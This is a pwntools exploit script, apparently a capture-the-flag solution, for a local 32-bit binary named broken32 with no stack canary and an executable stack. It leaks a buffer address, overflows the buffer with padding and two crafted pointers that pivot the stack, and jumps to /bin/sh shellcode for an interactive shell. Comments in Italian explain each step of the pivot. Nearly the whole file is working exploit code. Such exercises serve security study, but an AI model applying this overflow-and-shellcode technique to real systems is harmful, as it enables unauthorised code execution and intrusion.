#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./broken32
from pwn import *

context.terminal = ['gnome-terminal', '-e']
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./broken32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

shellcode = encode(asm(shellcraft.sh()), avoid="\x0a")
#aux = asm("sub rsp, 0x10")
aux = "".encode()
off_to_ebp_from_buffer = 0x18
dim_addr_arch = 4
off_sh = 64
io.recvuntil("What are you gonna do now?\n")
buffer_addr = io.recvline(keepends=False)
print(buffer_addr)
padding_size = off_to_ebp_from_buffer - (0x10 - 0x4)

#The padding puts the first address right before the $ebp-0x8 position
#The first address will be loaded into $esp at step 4
#The second address will be loaded into $esp at step 2
#The first address is located right before the second and the second points to the first
#The second address points to itself so that $ecx-0x4 will point to the first one
#The first address points to the shellcode

result = (b"A"*padding_size) + \
        p32(int(buffer_addr, 16) + padding_size + 2*dim_addr_arch) + \
        p32(int(buffer_addr, 16) + padding_size + dim_addr_arch) + shellcode
io.sendline(result)

io.interactive()

'''Descrizione operazioni processo:
    1) Inserisce i dati nel buffer
    2) Usa il valore puntato da $ebp-0x8, con ebp valore di esp in main prima dell'incremento dei blocchi della 
        stack necessaria ad accomodare l'array e le variabili locali (posto quindi a dim(array)=0x10 + push ebx=0x4 +
        push ecx=0x4 dopo la posizione di inizio dell'array), come nuovo valore di $esp
    3) Poppa il valore contenuto nell'indirizzo puntato da $esp in $ecx
    4) Usa $ecx-0x4 come nuovo valore di $esp
    5) Ret del valore contenuto nell'indirzzo puntato da $esp che deve essere l'indirizzo dello shellcode
'''
